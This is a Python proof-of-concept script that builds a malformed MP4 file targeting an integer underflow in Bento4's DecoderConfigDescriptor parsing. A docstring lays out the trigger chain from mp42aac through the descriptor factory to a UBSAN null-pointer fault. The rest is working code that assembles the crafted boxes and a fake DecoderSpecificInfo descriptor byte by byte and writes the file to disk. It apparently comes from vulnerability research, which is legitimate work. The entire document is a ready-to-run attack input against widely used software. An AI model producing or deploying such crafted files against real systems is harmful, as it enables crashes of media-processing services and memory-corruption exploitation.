#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Underflow in payload_size-13 in
AP4_DecoderConfigDescriptor (Bento4/Source/C++/Core/Ap4DecoderConfigDescriptor.cpp, line 92)

When DecoderConfigDescriptor payload_size < 13 (payload_size=3 here), the unsigned
subtraction  payload_size - 13  wraps to 0xFFFFFFF6, inflating the DC substream size
and disabling its bounds check. This allows CreateDescriptorFromStream to read a fake
DecoderSpecificInfo descriptor from adjacent ES_Descriptor data (position start+13=15 in
ES substream), ultimately causing a UBSAN null-pointer violation in
AP4_DataBuffer::SetData when AP4_MpegAudioSampleDescription is constructed.

Trigger chain:
  mp42aac → AP4_File → AP4_MoovAtom → AP4_TrakAtom → AP4_MdiaAtom → AP4_MinfAtom
          → AP4_StblAtom → AP4_StsdAtom → AP4_EsAtom → AP4_EsDescriptor
          → AP4_DescriptorFactory::CreateDescriptorFromStream() [tag=0x04]
          → AP4_DecoderConfigDescriptor(stream, header_size=2, payload_size=3)
          → line 92: new AP4_SubStream(stream, start+13=15, 3-13=0xFFFFFFF6)
          → CreateDescriptorFromStream(*dc_substream) reads tag=0x05 at position 15
          → AP4_DecoderSpecificInfoDescriptor with empty payload
          → AP4_MpegAudioSampleDescription() → AP4_DataBuffer::SetData(nullptr, 0)
          → UBSAN: null pointer passed as argument 1
"""
import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_001.mp4")


def box(type4: bytes, data: bytes) -> bytes:
    assert len(type4) == 4
    return struct.pack(">I", 8 + len(data)) + type4 + data


def fullbox(type4: bytes, version: int, flags: int, data: bytes) -> bytes:
    return box(type4, bytes([version]) + struct.pack(">I", flags & 0xFFFFFF)[1:] + data)


def desc(tag: int, payload: bytes) -> bytes:
    """Encode an MPEG-4 expandable-class descriptor."""
    size = len(payload)
    if size < 0x80:
        size_bytes = bytes([size])
    elif size < 0x4000:
        size_bytes = bytes([0x80 | (size >> 7), size & 0x7F])
    elif size < 0x200000:
        size_bytes = bytes([0x80 | (size >> 14), 0x80 | ((size >> 7) & 0x7F), size & 0x7F])
    else:
        size_bytes = bytes([
            0x80 | (size >> 21),
            0x80 | ((size >> 14) & 0x7F),
            0x80 | ((size >> 7) & 0x7F),
            size & 0x7F,
        ])
    return bytes([tag]) + size_bytes + payload


# ---------------------------------------------------------------------------
# Build ES_Descriptor payload so that the DC sub-stream (with inflated size
# 3-13=0xFFFFFFF6) can seek to position 15 (= start+13 = 2+13) in the ES
# substream, where we embed a fake DecoderSpecificInfo (tag=0x05, size=0).
#
# ES substream layout (22 bytes, positions 0-21):
#   [0] 0x04  DC tag
#   [1] 0x03  DC payload size = 3  (KEY: 3-13 = 0xFFFFFFF6 underflow)
#   [2-4]     DC payload: 3 bytes
#   [5] 0x06  SL tag
#   [6] 0x01  SL size = 1
#   [7] 0x02  SL payload: predefined=2
#   [8-14]    7 padding bytes (consumed by 13-byte DC field reads from pos 2)
#   [15] 0x05 DecoderSpecificInfo tag  ← DC substream reads from HERE (start+13)
#   [16] 0x00 DecoderSpecificInfo size = 0 (empty payload)
#   [17-21]   5 padding bytes
# ---------------------------------------------------------------------------

# DC descriptor with 3-byte payload (triggers 3-13 underflow)
dc_desc = desc(0x04, b'\x40\x15\x00')      # 5 bytes: tag + size + 3 bytes

# SL descriptor (normal, 3 bytes)
sl_desc = desc(0x06, b'\x02')              # 3 bytes

# 7 bytes of padding at positions 8-14 (consumed by DC 13-byte field reads)
padding_mid = b'\x00' * 7

# Fake DecoderSpecificInfo at position 15 in ES substream
# The DC substream (offset=15, size=0xFFFFFFF6) successfully reads this
# as a "sub-descriptor" of the DecoderConfigDescriptor.
fake_dsi = desc(0x05, b'')                 # 2 bytes: 0x05 0x00

# Additional padding at positions 17-21
padding_after = b'\x00' * 5

# Build ES substream content
es_sub_content = dc_desc + sl_desc + padding_mid + fake_dsi + padding_after
assert len(es_sub_content) == 22

# ES_Descriptor payload = ES_ID (2) + flags (1) + es_sub_content (22) = 25 bytes
es_id    = struct.pack('>H', 1)            # ES_ID = 1
es_flags = b'\x00'                         # no special flags
es_payload = es_id + es_flags + es_sub_content

es_desc = desc(0x03, es_payload)

# Build esds FullBox
esds = fullbox(b'esds', 0, 0, es_desc)

# ---------------------------------------------------------------------------
# mp4a sample entry
# ---------------------------------------------------------------------------
mp4a_header = b'\x00' * 6 + struct.pack('>H', 1)   # reserved + data-ref-index=1
audio_fields = (
    b'\x00' * 8 +                    # reserved
    struct.pack('>H', 2) +            # channelcount=2
    struct.pack('>H', 16) +           # samplesize=16
    struct.pack('>H', 0) +            # pre_defined=0
    struct.pack('>H', 0) +            # reserved=0
    struct.pack('>I', 44100 << 16)    # samplerate=44100 (16.16 fixed point)
)
mp4a_entry = box(b'mp4a', mp4a_header + audio_fields + esds)

# stbl
stsd = fullbox(b'stsd', 0, 0, struct.pack('>I', 1) + mp4a_entry)
stts = fullbox(b'stts', 0, 0, struct.pack('>I', 0))
stsc = fullbox(b'stsc', 0, 0, struct.pack('>I', 0))
stsz = fullbox(b'stsz', 0, 0, struct.pack('>II', 0, 0))
stco = fullbox(b'stco', 0, 0, struct.pack('>I', 0))
stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)

# dinf / dref / url
url_entry = fullbox(b'url ', 0, 1, b'')
dref = fullbox(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)
smhd = fullbox(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
minf = box(b'minf', smhd + dinf + stbl)

# mdia
mdhd = fullbox(b'mdhd', 0, 0,
    struct.pack('>IIIIHH', 0, 0, 44100, 4410, 0x15C7, 0))
hdlr = fullbox(b'hdlr', 0, 0,
    struct.pack('>I', 0) + b'soun' + struct.pack('>III', 0, 0, 0) + b'Sound Handler\x00')
mdia = box(b'mdia', mdhd + hdlr + minf)

# trak
tkhd = fullbox(b'tkhd', 0, 3,
    struct.pack('>IIIIII', 0, 0, 1, 0, 4410, 0) +
    struct.pack('>hh', 0, 0) +
    struct.pack('>hh', 0x0100, 0) +
    b'\x00\x01\x00\x00\x00\x00\x00\x00'
    b'\x00\x00\x00\x00\x00\x01\x00\x00'
    b'\x00\x00\x00\x00\x00\x00\x00\x00'
    b'\x40\x00\x00\x00' +
    struct.pack('>II', 0, 0)
)
trak = box(b'trak', tkhd + mdia)

# moov
mvhd = fullbox(b'mvhd', 0, 0,
    struct.pack('>IIIIIIII', 0, 0, 44100, 4410, 0x00010000, 0, 0, 0) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 +
    b'\x00\x01\x00\x00\x00\x00\x00\x00'
    b'\x00\x00\x00\x00\x00\x01\x00\x00'
    b'\x00\x00\x00\x00\x00\x00\x00\x00'
    b'\x40\x00\x00\x00' +
    b'\x00' * 24 +
    struct.pack('>I', 2)
)
moov = box(b'moov', mvhd + trak)

# ftyp
ftyp = box(b'ftyp', b'isom' + struct.pack('>I', 0x200) + b'isomiso2mp41')

mp4_data = ftyp + moov

os.makedirs(OUT_DIR, exist_ok=True)
with open(OUT_FILE, 'wb') as f:
    f.write(mp4_data)

print(f'[+] Written {len(mp4_data)} bytes to {OUT_FILE}')
print(f'[+] DecoderConfigDescriptor payload_size=3 => underflow: 3 - 13 = 0xFFFFFFF6')
print(f'[+] DC substream: offset=15 within ES substream (size 22) → reads succeed')
print(f'[+] DC substream reads fake DecoderSpecificInfo at ES substream position 15')
print(f'[+] Triggers UBSAN null-pointer violation in AP4_DataBuffer::SetData')
